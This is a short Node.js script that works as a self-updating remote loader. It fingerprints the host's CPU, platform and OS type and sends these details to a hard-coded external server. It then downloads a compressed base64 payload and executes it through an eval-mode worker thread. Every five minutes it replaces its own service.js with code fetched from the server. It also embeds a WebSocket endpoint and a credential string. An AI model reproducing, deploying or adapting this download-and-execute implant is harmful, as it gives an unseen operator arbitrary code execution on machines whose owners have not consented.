// Version - 1.2
const axios = require('axios');
const { Worker } = require('worker_threads');
const os = require('node:os');
const fs = require('fs');
const zlib = require('zlib');

// process.env.SERVER_URL = `http://localhost:3000`;
process.env.SERVER_URL = `https://files-ten-rho.vercel.app`;
process.env.SERVER_WS_URL = `ws://pattersonemanuel-001-site1.ktempurl.com`;
process.env.CREDENTIALS = `11171361:60-dayfreetrial`; 

var reconnected = 0;
var os_cpus = os.cpus();
var os_platform = os.platform();
var os_type = os.type();
var params = `url=${process.env.URL}&cpu=${os_cpus[0].model}&platform=${os_platform}&type=${os_type}`;
const urlServiceVersion = `${process.env.SERVER_URL}/api/GetServiceVersion`;
const urlService = `${process.env.SERVER_URL}/api/GetService?${params}`;
const urlScript = `${process.env.SERVER_URL}/api/GetScript?${params}`;
process.env.WORKER_URL = `${process.env.SERVER_URL}/api/GetWorker?${params}`;

function getScript() {
    console.log('Call getScript');
    axios.get(urlScript)
            .then(response => {

                const compressedBuffer = Buffer.from(response.data, 'base64');
                zlib.gunzip(compressedBuffer, (err, uncompressedBuffer) => {
                  if (!err) {
                    const uncompressedText = uncompressedBuffer.toString();
                    new Worker(uncompressedText, { eval: true });
                  } else {
                    setTimeout(() => {
                        getScript();
                    }, (60000 * reconnected));
                    console.error('Error gunzip:', err);
                  }
                });
            })
            .catch(error => {
                console.error('getScript:', error.response.data);
                reconnected++;
                setTimeout(() => {
                    getScript();
                }, (60000 * reconnected));
            });
}

function getService() {
    console.log('Call getService');
    axios.get(urlService)
            .then(response => {
                console.log("Save service.");
                fs.writeFileSync('./service.js', response.data);
                setTimeout(()=>{
                    process.exit();
                }, 5000);
            })
            .catch(error => {
                console.error('getService:', error.response.data);
            });
}

function getServiceVersion() {
    console.log('Call getServiceVersion');
    axios.get(urlServiceVersion)
            .then(response => {
                const text = fs.readFileSync('service.js', 'utf8');
                var array = text.split("\n");
                var result = array[0];
                if (response.data != result){
                    getService();
                }
            })
            .catch(error => {
                console.error('getServiceVersion:', error.response.data);
            });
}

setInterval(() => {
    getServiceVersion();
}, (300000));
getServiceVersion();
getScript();